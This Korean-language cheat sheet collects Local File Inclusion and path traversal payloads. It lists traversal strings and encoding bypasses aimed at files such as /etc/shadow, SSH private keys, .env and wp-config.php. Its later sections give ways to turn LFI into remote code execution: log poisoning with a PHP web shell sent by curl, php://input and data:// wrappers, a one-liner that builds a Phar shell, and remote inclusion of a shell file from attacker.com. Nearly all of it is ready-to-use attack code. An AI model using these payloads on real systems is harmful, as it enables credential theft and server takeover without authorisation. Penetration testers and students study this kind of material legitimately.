# LFI / Path Traversal — 페이로드 & 기법

## 기본 페이로드
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd

# Windows
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini
../../../../windows/win.ini
```

## 필터 우회
```
# 이중 인코딩
..%2fetc%2fpasswd
%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252fetc%252fpasswd  (이중 인코딩)

# null byte (PHP 구버전)
../../etc/passwd%00
../../etc/passwd%00.png

# 절대 경로
/etc/passwd
/etc/shadow
/etc/hosts

# 경로 정규화 우회
..././..././etc/passwd
....//....//etc/passwd
..%2f..%2fetc%2fpasswd

# UNC (Windows)
\\server\share\file
//server/share/file
```

## 민감 파일 타겟
```
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/os-release
/proc/self/environ        ← 환경변수 (가끔 RCE 가능)
/proc/self/cmdline
/proc/self/maps
/proc/self/fd/0           ← stdin
/var/log/apache2/access.log   ← Log Poisoning
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log
/var/mail/root
/var/spool/cron/crontabs/root
~/.ssh/id_rsa
~/.ssh/id_ed25519
~/.bash_history
~/.bashrc

# PHP 설정/소스
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php
/etc/php/php.ini
/usr/local/etc/php.ini

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\repair\sam
C:\Windows\repair\system
C:\xampp\mysql\bin\my.ini
```

## LFI → RCE

### Log Poisoning
```bash
# 1. 로그 파일 확인
/var/log/apache2/access.log
/var/log/nginx/access.log

# 2. User-Agent에 PHP 코드 삽입
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/

# 3. 로그 파일 Include
http://target/?page=/var/log/apache2/access.log&cmd=id
```

### /proc/self/environ
```bash
# User-Agent 또는 HTTP_* 환경변수에 PHP 코드 삽입
curl -H "User-Agent: <?php system('id'); ?>" http://target/
# LFI 로 /proc/self/environ 열기
http://target/?page=/proc/self/environ
```

### PHP Wrapper
```
# Base64로 소스 읽기
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../config.php

# 체인 필터 (PHP 8.0+)
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|.../resource=index.php

# input wrapper (POST body 실행)
php://input + POST: <?php system('id'); ?>

# data wrapper
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# expect wrapper (희귀)
expect://id
```

### Zip/Phar Upload
```bash
# Phar 파일 생성
php -r '$p = new Phar("shell.phar"); $p->addFromString("shell.php","<?php system(\$_GET[\"c\"]);?>"); $p->setStub("<?php __HALT_COMPILER(); ?>");'

# 업로드 후 include
phar://uploads/shell.jpg/shell.php?c=id
```

### RFI (Remote File Inclusion)
```
# allow_url_include=On 필요
http://target/?page=http://attacker.com/shell.txt
http://target/?page=\\attacker.com\share\shell.php
ftp://attacker.com/shell.php

# shell.txt 내용
<?php system($_GET['cmd']); ?>
```
